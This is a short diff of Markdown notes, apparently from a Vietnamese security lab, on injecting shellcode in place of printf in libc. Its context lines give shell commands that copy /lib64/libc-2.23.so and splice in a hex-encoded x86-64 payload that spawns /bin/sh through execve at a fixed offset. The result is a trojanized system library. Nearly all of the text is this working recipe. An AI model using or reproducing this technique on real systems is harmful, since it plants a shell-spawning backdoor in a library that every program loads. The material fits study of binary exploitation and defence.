@@ -3,11 +3,13 @@ Chèn shellcode vào vị trí của hàm printf trong libc
 ![alt text](image-1.png)
 
 
+
 ```sh
 head -c 344224 /lib64/libc-2.23.so > libc.so.6
 echo -ne '\x48\x31\xff\x48\x31\xf6\xe8\x65\x55\x0a\x00\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' >> libc.so.6
 tail -c+344259 /lib64/libc-2.23.so >> libc.so.6
 ```
+
 
 
 ![alt text](image-2.png)
